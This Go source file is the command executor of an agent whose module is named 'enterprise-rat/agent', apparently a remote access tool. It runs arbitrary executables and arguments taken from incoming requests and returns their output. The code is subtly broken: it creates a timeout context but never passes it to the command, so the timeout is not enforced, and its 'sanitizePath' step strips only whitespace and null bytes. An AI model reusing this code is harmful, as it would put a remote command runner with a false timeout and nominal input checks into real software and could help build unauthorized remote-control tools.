package executor

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strings"
	"time"

	"github.com/enterprise-rat/agent/internal/models"
)

func ExecuteCommand(req *models.CommandRequest) *models.CommandResponse {
	resp := &models.CommandResponse{
		CommandID: req.CommandID,
	}

	if req.TimeoutSeconds <= 0 {
		req.TimeoutSeconds = 300
	}

	if req.TimeoutSeconds > 3600 {
		req.TimeoutSeconds = 3600
	}

	executable := sanitizePath(req.Executable)
	sanitizedArgs := make([]string, 0, len(req.Args))
	for _, arg := range req.Args {
		sanitizedArgs = append(sanitizedArgs, sanitizePath(arg))
	}

	ctx, cancel := context.WithTimeout(context.Background(), time.Duration(req.TimeoutSeconds)*time.Second)
	defer cancel()

	var stdout, stderr bytes.Buffer

	cmd := exec.Command(executable, sanitizedArgs...)
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()

	resp.StdOut = strings.TrimSpace(stdout.String())
	resp.StdErr = strings.TrimSpace(stderr.String())

	if ctx.Err() == context.DeadlineExceeded {
		resp.ExitCode = -1
		resp.ErrorMsg = "command timed out"
		return resp
	}

	if err != nil {
		if exitErr, ok := err.(*exec.ExitError); ok {
			resp.ExitCode = exitErr.ExitCode()
		} else {
			resp.ExitCode = -1
			resp.ErrorMsg = fmt.Sprintf("execution error: %v", err)
		}
	}

	return resp
}

func sanitizePath(path string) string {
	path = strings.TrimSpace(path)
	path = strings.ReplaceAll(path, "\x00", "")
	return path
}
